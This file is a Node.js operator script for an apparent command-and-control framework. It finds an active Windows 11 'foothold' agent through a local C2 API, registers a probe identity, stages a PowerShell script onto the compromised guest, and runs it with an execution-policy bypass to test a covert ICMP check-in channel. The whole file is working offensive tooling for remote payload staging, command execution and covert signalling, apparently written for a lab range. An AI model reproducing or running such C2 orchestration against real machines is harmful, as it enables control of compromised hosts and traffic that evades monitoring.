// probe-wire-guest.mjs — stages guest-icmp-send.ps1 to the live foothold and fires ONE
// governed type-0 pull frame at the channel, then reports both ends: the guest's send
// result and the channel's intake (checkins / liveVerified). Pair it with a scratch
// bridge on the host logging recv lines for the lowest-level signal.
// Usage: node scripts/probe-wire-guest.mjs
const API = 'http://127.0.0.1:8971';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { readFileSync } = await import('node:fs');

const ch = await (await fetch(API + '/api/channel')).json();
const a = (ch.agents || []).find((x) => x.label === 'win11-range-foothold' && x.health === 'active');
if (!a) { console.log('NO-ACTIVE-FOOTHOLD'); process.exit(1); }
console.log('foothold:', a.agentId, 'checkins', a.checkins);
const reg = await (await fetch(API + '/api/channel/agent', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'register', label: 'wire-probe' }) })).json();
console.log('probe identity:', reg.agentId);
const b64 = readFileSync(new URL('./guest-icmp-send.ps1', import.meta.url)).toString('base64');
const st = await (await fetch(API + '/api/channel/stage', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: a.agentId, name: 'guest-icmp-send.ps1', b64 }) })).json();
if (!st.taskId) { console.log('stage rejected:', JSON.stringify(st)); process.exit(1); }
const waitTask = async (tid, s) => {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await (await fetch(API + '/api/channel/tasks?agent=' + a.agentId)).json();
    const x = (tasks || []).find((y) => y.taskId === tid);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
};
console.log('staged:', await waitTask(st.taskId, 20));
const cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\agentbox\\guest-icmp-send.ps1 -AgentId ' + reg.agentId + ' -Token ' + reg.token;
const t = await (await fetch(API + '/api/channel/task', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ agentId: a.agentId, kind: 'shell', data: cmd }) })).json();
const out = await waitTask(t.taskId, 40);
console.log('guest says:', JSON.stringify(out));
await sleep(3000);
const ch2 = await (await fetch(API + '/api/channel')).json();
const me = (ch2.agents || []).find((x) => x.agentId === reg.agentId);
console.log('channel intake:', me ? ('checkins ' + me.checkins + ' liveVerified ' + ch2.icmp.liveVerified) : 'missing');
